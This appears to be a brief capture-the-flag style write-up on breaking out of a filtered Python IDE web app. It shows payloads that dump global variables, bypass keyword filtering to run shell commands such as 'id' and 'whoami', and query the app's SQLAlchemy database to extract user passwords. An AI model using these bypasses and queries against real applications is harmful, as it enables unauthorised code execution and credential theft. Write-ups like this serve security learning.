## Intro
Web-app with interactive python IDE. Most os-related keywords were blocked.

## Recon
Dump all global variables available to the app
```
raise Exception(globals())
```
Try to bypass filtering
```
os.system('id')
os.popen('whoami').read()
__import__('subprocess').check_output(['id'])
getattr(__builtins__, '__import__')('os').system('id')
eval("__import__('os').system('id')")
```

## SQLAlchemy
In the specific box, the Python app was using SQLAlchemy, from the dump:
```
SQLAlchemy sqlite:////home/app-production/app/instance/database.db
[...]
<function redirect at 0x7f73e14753a0>, 'url_for': <function url_for at 0x7f73e1475310>, 'session': <SecureCookieSession {'_flashes': [('message', 'Registration successful! You can now log in.'), ('message', 'Login successful!')], 'user_id': 3}>
[...]
'User': <class 'app.User'>, 'Code': <class 'app.Code'>
```
I was able to query it using following code:
```
print(User.query.all())
print(str(db.session.query(User).all()))
print([str((u.id, u.username, u.password)) for u in db.session.query(User).all()])
```
Which gave me user passwords :)
